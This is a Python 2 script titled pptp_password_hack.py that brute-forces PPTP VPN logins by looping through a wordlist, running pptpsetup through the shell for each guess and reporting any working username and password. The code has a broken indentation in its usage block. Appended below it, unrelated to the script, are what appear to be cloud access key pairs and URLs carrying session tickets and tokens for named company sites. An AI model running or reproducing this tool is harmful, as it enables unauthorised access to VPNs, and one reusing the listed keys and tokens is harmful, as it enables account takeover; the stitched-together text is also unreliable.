import sys
import os
import time
import subprocess
timeout = 10
def test_vpn(ip,name,password):
	password = password[:-1]
	del_vpn = os.popen('pptpsetup --delete testvpn').read()
	command = 'pptpsetup --create testvpn --server '+ip+' --username '+name+' --password '+password+' --encrypt --start'
#	print command
	print '[*]Try to connect:%s,%s:%s'%(ip,name,password)
	
	p = subprocess.Popen(command, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True)  
	time.sleep(timeout)
	vpn_status =  os.popen('ifconfig').read()
#	print vpn_status
	if vpn_status.find('ppp0') !=-1:
		print ('[+]Success')
		print 'User:%s'%(name)
		print 'Password:%s'%(password)
		print '[*]Try to clean up,kill pptp'
		if os.system('pkill pptp')==0:
			print 'Done.'
			sys.exit(0)
	else:
		print '[!]Wrong username or password'
		return False
if __name__ == '__main__':
	if len(sys.argv)<3:
	print '[!]Wrong parameter'
		print 'Usage:'
		print '	pptp_password_hack.py <ip> <user>'
		sys.exit(0)
	else:
		file_object = open('wordlist', 'r')
		for line in file_object:
			test_vpn(sys.argv[1],sys.argv[2],line)
AccessKeyId=LTAI4G7vtqmfz981S5caL2hM
AccessKeySecret=LTAI1G7vtqm1z981S6caL2aM
url=https://soc.security.xindong.com/api/sys/getToken?ticket=ST-2113-zSCj856J6-aPaVwvT12388mAxe9M-idaas199
url=https://accounts.taptap.io/login?session=q5BpIiKMZhJjqWGT2zfOnhursWM6S1I8IRKYh4Ftixx1SdjCL7q2Q0RxM75jsZXr
